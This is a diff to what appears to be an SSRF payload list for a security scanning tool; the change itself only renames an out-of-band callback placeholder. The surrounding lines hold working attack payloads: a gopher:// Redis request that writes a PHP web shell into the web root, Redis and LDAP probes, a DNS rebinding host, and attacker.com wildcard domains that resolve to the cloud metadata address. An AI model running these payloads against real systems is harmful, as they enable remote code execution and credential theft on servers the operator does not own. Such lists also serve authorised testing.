@@ -52,7 +52,7 @@
         {"payload": "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%20%3F%3E%22%0d%0aBGSAVE%0d%0a", "description": "Gopher Redis RCE — CONFIG SET to write PHP shell via BGSAVE", "waf_bypass": false},
         {"payload": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$10%0d%0ahelloworld%0d%0a", "description": "Gopher protocol to Redis SET command", "waf_bypass": false},
         {"payload": "dict://127.0.0.1:6379/info", "description": "dict:// protocol to Redis INFO", "waf_bypass": false},
-        {"payload": "sftp://COLLABORATOR_URL:2222/", "description": "SFTP scheme to confirm outbound connection via Collaborator", "waf_bypass": false},
+        {"payload": "sftp://COLLABORATOR:2222/", "description": "SFTP scheme to confirm outbound connection via Collaborator", "waf_bypass": false},
         {"payload": "ldap://127.0.0.1:389/", "description": "LDAP scheme to internal LDAP server", "waf_bypass": false}
       ]
     },
@@ -60,7 +60,7 @@
       "description": "DNS rebinding and time-of-check bypass payloads",
       "payloads": [
         {"payload": "http://make-<random>.1u.ms/", "description": "1u.ms DNS rebind service (resolves to 127.0.0.1 after first response)", "waf_bypass": true},
-        {"payload": "http://COLLABORATOR_URL/", "description": "Burp Collaborator for SSRF OOB detection — replace COLLABORATOR_URL with output of generate_collaborator_payload()", "waf_bypass": false},
+        {"payload": "http://COLLABORATOR/", "description": "Burp Collaborator for SSRF OOB detection — replace COLLABORATOR with output of generate_collaborator_payload()", "waf_bypass": false},
         {"payload": "http://169.254.169.254.attacker.com/", "description": "DNS wildcard resolving to metadata IP", "waf_bypass": true},
         {"payload": "http://127.0.0.1.attacker.com/", "description": "DNS wildcard resolving to localhost", "waf_bypass": true}
       ]
